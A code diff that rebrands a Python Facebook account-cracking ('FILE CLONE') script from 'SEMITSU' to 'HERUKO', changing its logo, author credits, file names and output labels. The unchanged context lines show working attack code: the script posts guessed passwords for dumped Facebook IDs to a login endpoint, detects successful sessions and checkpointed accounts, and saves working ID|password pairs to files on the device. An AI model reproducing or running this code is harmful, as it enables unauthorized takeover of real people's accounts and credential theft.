@@ -1,4 +1,4 @@
-#sc by semitsu#
+#sc by semits#
 from os import path
 import os,base64,zlib,pip,urllib
 print('\033[1;32m') 
@@ -36,15 +36,17 @@ def UA():
 modlll = random.choice(['vivo 1920','2209116AG','SM-A235F','SM-F936B','SM-A525F','SM-G3518','U319AA','SM-A716U']) 
 #------------------------------------------------#
 logo=("""\033[1;39m
-████████████████████████████████████████████
-█─▄▄▄▄█▄─▄▄─█▄─▀█▀─▄█▄─▄█─▄─▄─█─▄▄▄▄█▄─██─▄█
-█▄▄▄▄─██─▄█▀██─█▄█─███─████─███▄▄▄▄─██─██─██
-▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▀▄▄▄▄▀▀
+╔╗─╔╦═══╦═══╦╗─╔╦╗╔═╦═══╗
+║║─║║╔══╣╔═╗║║─║║║║╔╣╔═╗║
+║╚═╝║╚══╣╚═╝║║─║║╚╝╝║║─║║
+║╔═╗║╔══╣╔╗╔╣║─║║╔╗║║║─║║
+║║─║║╚══╣║║╚╣╚═╝║║║╚╣╚═╝║
+╚╝─╚╩═══╩╝╚═╩═══╩╝╚═╩═══╝
 \033[1;37m================\033[1;37m===========\033[1;37m================
                \033[1;32mVERISION\033[1;31m : \033[1;32m1.0.0
 \033[1;37m================\033[1;37m===========\033[1;37m================
- \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32mSEMITSU ! 
- \033[1;32m[=]\033[1;37m FACEBOOK \033[1;31m: \033[1;32mJAY MAR !
+ \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32mHERUKO ! 
+ \033[1;32m[=]\033[1;37m FACEBOOK \033[1;31m: \033[1;32mHERUKO ZHEN !
  \033[1;32m[=]\033[1;37m STATE \033[1;31m   : \033[1;32mFREE
  \033[1;32m[=]\033[1;37m TIPE\033[1;31m     : \033[1;32mFILE CLONE
 \033[1;37m================\033[1;37m===========\033[1;37m================""")
@@ -108,7 +110,7 @@ def menu():
                                 print('\033[1;32m [=]\033[1;37m Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input('\033[1;32m [=]\033[1;37m Press enter to back ')
-                                os.system('python Semitsu.py')
+                                os.system('python Heruko.py')
                         elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -126,7 +128,7 @@ def menu():
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mSEMITSU-XD\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mHERUKO-XD\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -176,16 +178,16 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [SEMITSU-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [HERUKO-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/SEMITSU-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:                                   
-                                                #print('\r\r\x1b[38;5;208m [SEMITSU-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SEMITSU-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                #print('\r\r\x1b[38;5;208m [HERUKO-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/HERUKO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break                                        
-                                                open('/sdcard/SEMITSU-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/HERUKO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
